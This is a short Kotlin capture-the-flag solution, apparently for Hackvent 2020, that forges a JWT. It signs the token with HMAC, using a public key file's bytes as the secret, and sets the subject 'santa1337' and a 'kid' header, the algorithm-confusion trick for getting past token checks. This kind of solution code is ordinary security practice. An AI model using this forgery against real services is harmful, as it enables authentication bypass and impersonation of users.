package cz.vernjan.ctf.hv20

import cz.vernjan.ctf.Resources
import io.jsonwebtoken.Jwts
import io.jsonwebtoken.security.Keys
import java.util.*

fun main() {
    val key = Keys.hmacShaKeyFor(Resources.asBytes("hv20/key.pub"))

    val jws = Jwts.builder()
        .setSubject("santa1337")
        .setIssuedAt(Date())
        .setExpiration(Date(System.currentTimeMillis() + 1000*3600*24))
        .setHeaderParam("kid", "1d21a9f945")
        .signWith(key).compact()

    println(jws)
}
